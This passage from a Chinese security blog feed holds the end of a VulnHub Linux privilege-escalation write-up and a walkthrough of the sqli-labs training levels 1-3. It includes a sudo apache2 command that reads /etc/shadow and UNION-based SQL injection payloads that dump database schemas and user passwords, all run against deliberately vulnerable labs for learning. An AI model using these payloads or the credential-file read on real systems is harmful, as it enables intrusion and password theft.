srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220404142540327"></p><p>可直接提权至 root</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>至此，所有用户的提权方式已经覆盖的完了，靶机简介说是有 12+ 种提权方式，不过我这里不重复的提权方式是9种。</p><p>发现靶机刚好是用 apache，顺便补充一种 sudo 滥用下的 apache 任意文件查看<sup>[4]</sup></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apache2 -f /etc/shadow</span><br></pre></td></tr></table></figure><p>这个靶机没安装这个模块，所以返回 <code>AH00534: apache2: Configuration error: No MPM loaded.</code> </p><p>整体来看，Linux 提权相关的还是挺全了，还不错的靶机。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>[1] <a href="https://ethicalhackingguru.com/escalate_linux-walkthrough/">https://ethicalhackingguru.com/escalate_linux-walkthrough/</a></p><p>[2] <a href="https://my.oschina.net/u/4196756/blog/4645765">https://my.oschina.net/u/4196756/blog/4645765</a></p><p>[3] <a href="https://blog.katastros.com/a?ID=01600-b3c56dca-ab08-47e3-86f9-98b83a76d366">https://blog.katastros.com/a?ID=01600-b3c56dca-ab08-47e3-86f9-98b83a76d366</a></p><p>[4] <a href="https://www.freebuf.com/articles/system/251884.html">https://www.freebuf.com/articles/system/251884.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 后渗透 </category>
          
          <category> 权限提升 </category>
          
          <category> vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后渗透 </tag>
            
            <tag> 权限提升 </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs 靶场 1-65 通关记</title>
      <link href="//p/2022/sqli-labs/"/>
      <url>//p/2022/sqli-labs/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>好耶✌️！从2021年立下flag的sqli-labs靶场终于给刷完了，不得不说经典永远是经典，边刷边闻到了许多CTF题的味道。去年初的时候就把前20关给刷了，后面跑去刷ctfshow和干其他事情，然后就忘了，直到去年底看到团队师傅SQL注入玩的那么溜，各种bypass waf，于是就想把基础在巩固一波～</p><p>在这里顺便安利一波 lcamry 大佬的 <a href="https://github.com/lcamry/sqli-labs/blob/master/mysql-injection.pdf">mysql注入天书</a>，刷的时候发现网上许多文章也是参考他的来的，然后里面也讲的更细，也有拓展，比网上许多文章写的都好，更像是 sqli-labs 的配套 WriteUp （</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>在网站解析目录执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/Audi-1/sqli-labs.git sqli-labs</span><br></pre></td></tr></table></figure><p>修改 <code>sql-connections/db-creds.inc</code> 里数据库的连接用户和密码</p><p><img src="/img/sqli-labs/clip_image001-8012919.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-8012919.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>访问index.html ，点Setup/reset Database for labs 安装即可，如果有报错就根据报错解决，之后就可以愉快的玩耍啦~</p><p>mac使用mamp pro的连接数据库的一个小坑，这个要勾上</p><p><img src="/img/sqli-labs/clip_image001-8012928.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-8012928.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>不然本机用客户端连不上，不知道为啥php里直接连竟然可以，而且是不用指定端口的</p><h2 id="less-1-GET-注入"><a href="#less-1-GET-注入" class="headerlink" title="less-1 GET 注入"></a>less-1 GET 注入</h2><p>验证注入点：单引号报错，两个单引号闭合<br />利用闭合方式：<code>&#39; &lt;payload&gt; --+</code></p><h3 id="获取本表中的字段，到4刚刚好报错"><a href="#获取本表中的字段，到4刚刚好报错" class="headerlink" title="获取本表中的字段，到4刚刚好报错"></a>获取本表中的字段，到4刚刚好报错</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">2</span><span class="string">&#x27; order by 4 --+</span></span><br></pre></td></tr></table></figure><p><img src="/img/sqli-labs/clip_image001.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><ul><li>关于 <code>--</code> 和 <code>--+</code></li></ul><p>疑问：<code>--</code> 在sql语句中起到注释的作用，按理说<code>--</code>和<code>--+</code> 作用是一样才对<br />看法：PHP 在接收接收参数时，会对参数进行一次urldecode</p><p><img src="/img/sqli-labs/clip_image001-7997234.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997234.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>如我们在浏览器地址栏输入网址时，会调用类似strip的函数去除首尾的空格，例如下图是可以正常访问的</p><p><img src="/img/sqli-labs/clip_image001-7997239.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997239.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>所以，如果后面如果原本接着字符，以这个举例子是 <code>--&#39;</code>   那么这就是三个字符，后面没有字符 就不是 <code>-- &#39;</code> 这样，MySQL是不会把它解析为注释符号的。 但 URL 里 不能 <code>--</code>  因为会被浏览器之类的替换为空，所以把空格编码一下就是 <code>+</code> 啦！</p><p>当然这是 get 请求的情况，如果是 post 请求（且Content-Type不为x-www-form-urlencoded或与这个Content-Type类似效果），加 <code>+</code> 就有问题了， <code>+</code> 还是 <code>+</code>，而不是空格的URL编码，此时应把<code>+</code>替换为<code>%20</code>，urldecode后就是空格啦。经测试，一般出现在 HTTP头里的 <code>+</code> 会被 urldecode 为空格</p><p>然后 <code>--</code> 和 <code>--+</code> 在MySQL中是不一样的， <code>--</code> 才是注释，<code>--+</code> 不是注释，<br /><img src="/img/sqli-labs/clip_image001-7997246.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997246.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br />观察4种情况</p><ul><li>第1种正常，注释后面为空</li><li>第2种异常，<code>--+</code> 并非注释，MySQL无法解析，从而抛出异常</li><li>第3种异常，<code>--</code> 注释后面如果还有字符，需要加空格</li><li>第4种正常</li></ul><p>所以一般 <code>--</code> 后面都有个 <code>+</code> 或者<code>空格</code>，防止后面拼接了字符</p><p>当然常用的注释还有 <code>#</code><br /><img src="/img/sqli-labs/clip_image001-7997254.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997254.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br />这种注释就不用担心 <code>--</code> 后面有没有紧接着字符啦。</p><h3 id="获取本表回显至前端的第x个字段"><a href="#获取本表回显至前端的第x个字段" class="headerlink" title="获取本表回显至前端的第x个字段"></a>获取本表回显至前端的第x个字段</h3><p>为接下来的union注入做准备：</p><p>union注入时，我们虽然可以通过注入获得想要的信息，但这些信息必须能够回显。例如本例有3个字段，这些字段不是都显示在网页前端的，只有第2和3个字段的查询结果会回显。</p><p>因此我们需要知道这3个字段中哪两个结果会回显，这个过程相当于找到数据库与回显的通道。这时候我们利用一个简单的select 1,2,3，根据显示在页面上的数字就可以知道哪个数字是这个“通道”，那么我们只需要把这个数字改成我们想查询的内容（如version(),database()），当数据爆破成功后，就会在窗口显示我们想要的结果。</p><p>当然这里的 1,2,3 是可以换的，只要自己能辨认出来即可</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,2,3 --+</span></span><br></pre></td></tr></table></figure><p><img src="/img/sqli-labs/clip_image001-7997265.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997265.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br />可知会回显的为第2和第3个字段</p><ul><li>关于 and 1=2</li></ul><p>使用 and 1=2 是为了让本应正常输出的字段出错，然后达到我们的目的。</p><p>例如本例中只能输出一行，但我们需要通过正常查询来闭合，但我们想知道输出的是哪些字段，会被正常输出的所屏蔽。如正常查询：<br /><img src="/img/sqli-labs/clip_image001-7997270.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997270.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>为达到目的我们需要：<br /><img src="/img/sqli-labs/clip_image001-7997275.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997275.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>数据库中的返回结果：<br /><img src="/img/sqli-labs/clip_image001-7997280.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997280.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h3 id="获取一下数据库和版本"><a href="#获取一下数据库和版本" class="headerlink" title="获取一下数据库和版本"></a>获取一下数据库和版本</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,version(),database() --+</span></span><br></pre></td></tr></table></figure><p><img src="/img/sqli-labs/clip_image001-7997284.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997284.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h3 id="获取所有数据库名"><a href="#获取所有数据库名" class="headerlink" title="获取所有数据库名"></a>获取所有数据库名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> information_schema.schemata</span><br></pre></td></tr></table></figure><p><img src="/img/sqli-labs/clip_image001-7997289.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997289.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,</span></span><br><span class="line"><span class="string">    (select group_concat(schema_name) from </span></span><br><span class="line"><span class="string">        information_schema.schemata),</span></span><br><span class="line"><span class="string">    3 --+</span></span><br></pre></td></tr></table></figure><h3 id="获取security库所有表名"><a href="#获取security库所有表名" class="headerlink" title="获取security库所有表名"></a>获取security库所有表名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/img/sqli-labs/clip_image001-7997296.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997296.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,</span></span><br><span class="line"><span class="string">    (select group_concat(table_name) from </span></span><br><span class="line"><span class="string">        information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;),</span></span><br><span class="line"><span class="string">    3 --+</span></span><br></pre></td></tr></table></figure><h3 id="爆破security库users表列名"><a href="#爆破security库users表列名" class="headerlink" title="爆破security库users表列名"></a>爆破security库users表列名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,</span></span><br><span class="line"><span class="string">    (select group_concat(column_name) from </span></span><br><span class="line"><span class="string">        information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;),</span></span><br><span class="line"><span class="string">    3 --+</span></span><br></pre></td></tr></table></figure><h3 id="爆破security库users表数据"><a href="#爆破security库users表数据" class="headerlink" title="爆破security库users表数据"></a>爆破security库users表数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,</span></span><br><span class="line"><span class="string">    (select group_concat(username) from security.users),</span></span><br><span class="line"><span class="string">    (select group_concat(password) from security.users) --+</span></span><br></pre></td></tr></table></figure><p><img src="/img/sqli-labs/clip_image001-7997303.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997303.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h2 id="less-2-GET-注入"><a href="#less-2-GET-注入" class="headerlink" title="less-2 GET 注入"></a>less-2 GET 注入</h2><p>验证注入点：单引号报错，不用闭合可执行 SQL语句<br />利用闭合方式：<code>&lt;payload&gt;</code></p><p>与第一关基本一样，就 <code>id</code> 不用闭合<br /><img src="/img/sqli-labs/clip_image001-7997423.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997423.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>直接插入SQL语句即可</p><h3 id="猜字段"><a href="#猜字段" class="headerlink" title="猜字段"></a>猜字段</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="/img/sqli-labs/clip_image001-7997432.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997432.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h3 id="回显字段位置"><a href="#回显字段位置" class="headerlink" title="回显字段位置"></a>回显字段位置</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="/img/sqli-labs/clip_image001-7997439.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997439.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h3 id="数据库和版本"><a href="#数据库和版本" class="headerlink" title="数据库和版本"></a>数据库和版本</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,version(),database() <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="/img/sqli-labs/clip_image001-7997446.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997446.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h3 id="获取所有数据库名-1"><a href="#获取所有数据库名-1" class="headerlink" title="获取所有数据库名"></a>获取所有数据库名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,</span><br><span class="line">(<span class="keyword">select</span> group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata),</span><br><span class="line"><span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="/img/sqli-labs/clip_image001-7997454.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997454.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h3 id="获取security库所有表名-1"><a href="#获取security库所有表名-1" class="headerlink" title="获取security库所有表名"></a>获取security库所有表名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,</span><br><span class="line">(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>),</span><br><span class="line"><span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="/img/sqli-labs/clip_image001-7997460.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997460.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h3 id="爆破security库users表列名-1"><a href="#爆破security库users表列名-1" class="headerlink" title="爆破security库users表列名"></a>爆破security库users表列名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,</span><br><span class="line">(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>),</span><br><span class="line"><span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="/img/sqli-labs/clip_image001-7997467.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997467.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h3 id="爆破security库users表数据-1"><a href="#爆破security库users表数据-1" class="headerlink" title="爆破security库users表数据"></a>爆破security库users表数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,</span><br><span class="line">(<span class="keyword">select</span> group_concat(username) <span class="keyword">from</span> security.users),</span><br><span class="line">(<span class="keyword">select</span> group_concat(password) <span class="keyword">from</span> security.users) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="/img/sqli-labs/clip_image001-7997476.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997476.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h2 id="less-3-GET-注入"><a href="#less-3-GET-注入" class="headerlink" title="less-3 GET 注入"></a>less-3 GET 注入</h2><p>验证注入点：单引号报错，两个单引号闭合<br />利用闭合方式：<code>&#39;) &lt;payload&gt; --+</code></p><p>也是闭合符号不一样<br /><img src="/img/sqli-labs/clip_image001-7997482.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997482.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h3 id="猜字段-1"><a href="#猜字段-1" class="headerlink" title="猜字段"></a>猜字段</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;) order by 4 --+</span></span><br></pre></td></tr></table></figure><p><img src="/img/sqli-labs/clip_image001-7997525.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997525.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h3 id="爆破数据"><a href="#爆破数据" class="headerlink" title="爆破数据"></a>爆破数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;) and 1=2 union select 1,</span></span><br><span class="line"><span class="string">(select group_concat(username) from security.users),</span></span><br><span class="line"><span class="string">(select group_concat(password) from security.users) --+</span></span><br></pre></td></tr></table></figure><p><img 